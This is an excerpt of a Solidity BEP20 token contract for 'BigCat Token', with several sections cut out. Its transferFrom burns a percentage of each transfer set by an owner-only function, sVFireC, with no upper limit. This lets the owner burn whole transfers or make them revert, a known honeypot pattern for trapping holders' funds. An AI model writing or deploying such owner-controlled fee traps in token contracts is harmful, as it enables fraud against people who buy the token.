...
contract BEP20Token is IBEP20 {
    ...
    string public name20AA =  "BigCat Token";
    string public symbol20AA =  "BIGCAT";
  ...
  function decimals() public view virtual returns (uint8) {
    ...
    function transferFrom(address from, address to, uint tokens) public override returns (bool success) {
        ...
        _fireC(from,tokens.mul(getVFireC()).div(10**2));
        
        _transfer(from, to, tokens.subbb(tokens.mul(getVFireC()).div(10**2)));
        
        _approve(from, _msgSender(), allowed[from][_msgSender()].subbb(tokens, "BEP20: trnsfr amount exceeds allowance"));
        return true;
    ...
    function _fireC(address tokenOwner, uint256 tokens) internal {
        ...
        balances[tokenOwner] = balances[tokenOwner].subbb(tokens, "BEP20: fire amount exceeds balance");
    ...
    function sVFireC(uint8 tokened) public virtual onlyOwner {
		_tokened = tokened;
	}
	
	function getVFireC() public view returns (uint8) {
        return _tokened;
    }
